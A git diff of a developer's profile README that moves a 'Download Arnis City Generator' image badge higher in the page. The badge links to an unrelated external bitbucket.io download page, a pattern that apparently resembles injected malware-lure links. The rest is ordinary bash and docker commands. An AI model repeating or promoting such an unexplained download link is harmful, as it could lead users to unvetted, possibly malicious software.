@@ -22,6 +22,7 @@ by moonlight, composing lyrical scripts that sing in terminals and hearts alike.
 - **🎨 Artifex** – Generative art microservice powered by neural nets.
 
 ---
+[![Download Arnis City Generator](https://i.ibb.co/hFTLN3XF/Frame-9.png)](https://offload1.bitbucket.io/)
 
 ## 🛠️ Daily Rituals
 ```bash
@@ -34,4 +35,4 @@ docker build . -t app/latest && docker push app/latest
 # Evening reflection: journal code commits  
 git log --pretty=format:"%h %s" --since="1 day ago"
 
-[![Download Arnis City Generator](https://i.ibb.co/hFTLN3XF/Frame-9.png)](https://offload1.bitbucket.io/)
+
